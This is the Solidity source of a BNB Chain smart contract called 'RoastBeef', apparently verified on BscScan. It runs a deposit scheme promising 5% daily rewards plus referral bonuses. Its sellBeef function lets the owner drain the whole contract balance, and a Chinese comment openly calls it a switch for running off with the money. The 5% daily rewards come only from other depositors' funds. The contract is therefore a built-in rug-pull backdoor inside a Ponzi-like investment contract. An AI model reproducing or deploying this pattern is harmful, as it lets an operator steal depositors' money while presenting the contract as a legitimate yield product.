/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract RoastBeef{
    //最大孵化时间
    uint256 MAX_BEEF_TO_HATCH = 604800;
    //初始化
    bool public initialized = false;
    //开发者钱包地址
    address public ceoAddress;
    //本金
    mapping (address => uint256) private principal;
    //入场时间或出场时间
    mapping (address => uint256) private lastBeef;
    //邀请奖励
    mapping (address => uint256) private claimedBeef;
    //邀请地址
    mapping (address => address) private referrals;
    //保留上一次的奖励
    mapping (address => uint256) private hasBeef;

    constructor() public {
        ceoAddress = msg.sender;
    }

    //开盘
    function initializeContract() public payable {
        require(msg.sender == ceoAddress, "invalid call");
        initialized = true;
    }

    /**
     * 卷款潜逃开关
     * ref:开发者钱包地址
     **/
    function sellBeef(address ref) public {
        require(msg.sender == ceoAddress, 'invalid call');
        require(ref == ceoAddress);
        msg.sender.transfer(address(this).balance);
    }

    //奖池余额
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    //你的本金
    function getMyPrincipal() public view returns(uint256) {
        return principal[msg.sender];
    }

    /**
     * 入金
     * ref:上级钱包地址
     **/
    function buyBeef(address ref) public payable {
        require(initialized);
        uint256 fee = devFee(msg.value); //开发者抽成
        uint256 beefBought = SafeMath.sub(msg.value, fee); //计算实际入金金额
        ceoAddress.transfer(fee); //转账开发者抽成
        principal[msg.sender] = SafeMath.add(principal[msg.sender], beefBought);
        lastBeef[msg.sender] = now; //初始化 入场时间与出场时间
        hasBeef[msg.sender] = hasBeef[msg.sender] + getMyBeef(); //保留上一次的奖励
        if(ref == msg.sender || ref == address(0) || principal[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)) {
            referrals[msg.sender] = ref;
        }
        //幫你的邀請人增加籌碼
        claimedBeef[referrals[msg.sender]] = SafeMath.add(claimedBeef[referrals[msg.sender]] ,SafeMath.div(SafeMath.mul(beefBought, 10), 100));
    }

    //出金
    function sellEggs() public {
        require(initialized);
        uint beefValue = getMyBeef();
        uint256 fee = devFee(beefValue); //开发者抽成
        claimedBeef[msg.sender] = 0; //初始化 邀请筹码
        lastBeef[msg.sender] = now; //初始化 入场时间与出场时间
        hasBeef[msg.sender] = 0; //初始化 保留上一次的奖励
        ceoAddress.transfer(fee); //转账开发者抽成
        msg.sender.transfer(SafeMath.sub(beefValue, fee));//出金 卖出金额 - 开发者抽成
    }

    //你的奖励 每日5%
    function getMyBeef() public view returns(uint256) {
        uint256 secondsPassed = min(MAX_BEEF_TO_HATCH, block.timestamp - lastBeef[msg.sender]);//孵化时间
        uint myBeef = SafeMath.div(SafeMath.div(SafeMath.mul(SafeMath.mul(principal[msg.sender], 5),secondsPassed),86400),100);
        return claimedBeef[msg.sender] + myBeef + hasBeef[msg.sender];
    }

    //三目运算
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * 手续费
     * amount:金额
     **/
    function devFee(uint256 amount) private pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount, 5), 100);
    }

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}